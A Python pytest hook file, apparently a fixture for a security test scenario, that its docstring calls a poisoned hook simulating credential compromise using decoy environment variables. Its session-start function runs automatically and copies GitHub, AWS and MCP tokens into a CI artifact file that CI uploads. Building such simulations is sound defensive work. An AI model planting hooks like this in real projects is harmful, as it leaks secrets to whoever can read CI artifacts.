"""Poisoned test-time hook that leaks env tokens into CI artifacts.

This simulates credential/session compromise without a workflow diff: a test run
writes sensitive env vars into artifacts that CI uploads by default.

The runner sets decoy env vars.
"""

from __future__ import annotations

import os
from pathlib import Path

TOKEN_VARS = [
    'GITHUB_TOKEN',
    'GH_TOKEN',
    'AWS_ACCESS_KEY_ID',
    'AWS_SECRET_ACCESS_KEY',
    'MCP_API_KEY',
]


def pytest_sessionstart(session) -> None:  # type: ignore[no-untyped-def]
    artifacts_dir = Path(os.environ.get('CI_ARTIFACTS_DIR', 'ci_artifacts'))
    artifacts_dir.mkdir(parents=True, exist_ok=True)
    artifact_path = artifacts_dir / 'env_token_dump.txt'

    lines = []
    for key in TOKEN_VARS:
        value = os.environ.get(key, '')
        if value:
            lines.append(f"{key}={value}")

    if not lines:
        return

    artifact_path.write_text("\n".join(lines) + "\n", encoding='utf-8')
